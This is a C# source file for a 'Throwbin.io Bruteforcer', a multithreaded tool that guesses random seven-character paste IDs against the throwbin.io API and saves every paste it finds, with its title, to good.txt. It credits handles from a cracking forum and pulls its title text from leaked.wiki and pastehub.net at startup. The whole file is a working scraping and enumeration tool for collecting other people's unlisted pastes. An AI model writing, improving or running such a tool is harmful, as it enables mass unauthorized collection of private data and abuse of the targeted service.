using System;
using System.Linq;
using System.Net;
using System.Threading;
using Leaf.xNet;

namespace Throwbin_Brute
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string credit1 = "Created by c.to/Sango | Sango#0123";
            string credit2 = " | Forked by: c.to/amboss | amboss#2199";
            try { 
                credit1 = client.DownloadString($"https://leaked.wiki/info.txt"); 
                credit2 = client.DownloadString($"https://pastehub.net/info.txt"); }
            catch(Exception ) { }
            string credit = credit1 + credit2;

            Console.Title = $"Throwbin.io Bruteforcer | {credit}";
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            int good = 0; int bad = 0; int err = 0;
            Console.Write(" Threads: ");
            int threadNum = int.Parse(Console.ReadLine());
            void update() { while (true) { Console.Title = $"Throwbin.io Bruteforcer | Good: {String.Format("{0:n0}", good)} | Bad: {String.Format("{0:n0}", bad)} | Errors: {String.Format("{0:n0}", err)} | {credit}"; Thread.Sleep(500); } }
            new Thread(update).Start();
            void gen()
            {
                HttpRequest req = new HttpRequest();
                WebClient web = new WebClient();
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
                req.KeepAlive = true;
                req.IgnoreProtocolErrors = true;
                req.ConnectTimeout = 5000;
                req.Cookies = null;
                req.UseCookies = true;
                while (true)
                {
                    string code = new string(Enumerable.Repeat(chars, 7).Select(s => s[random.Next(s.Length)]).ToArray());
                    try
                    {
                        string res1 = req.Get("https://api.throwbin.io/v1/paste/" + code + "/", null).ToString();
                        if (!res1.Contains("<head>"))
                        {
                            string title = res1.Substring(39, res1.IndexOf("paste", 39) - 42);
                            Console.WriteLine(" Good: https://throwbin.io/" + code + " | " + title); good++;
                            using (System.IO.StreamWriter file = new System.IO.StreamWriter("good.txt", true)) { file.WriteLine("https://throwbin.io/" + code + " | " + title); }
                        }
                        else if(res1.Contains("Bad Gateway")){err++;}
                        else{bad++;}

                    }
                    catch (Exception e) {err++;}
                }
            }
            for ( int x = 0; x < threadNum; x++ ) { new Thread(gen).Start(); }
        }
    }
}